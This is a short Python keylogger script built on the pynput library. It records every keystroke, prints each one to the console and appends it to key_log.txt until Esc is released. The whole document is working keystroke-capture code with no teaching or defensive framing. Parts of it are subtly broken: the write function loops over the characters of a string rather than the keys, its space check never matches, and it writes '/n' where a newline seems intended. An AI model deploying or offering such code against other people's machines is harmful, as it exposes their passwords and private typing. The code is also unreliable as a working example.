
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []
def press(key):
    global keys,count
    keys.append(key)
    count += 1
    print("{0} Pressed".format(key))

    if count >= 1:
        count=0
        write_file(str(keys))
        keys=[]

def release(key):
    if key==Key.esc:
        return False

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            if key==Key.space:
                f.write('/n')
            else:
                f.write(str(key))

with Listener(on_press=press, on_release=release) as listener:
    listener.join()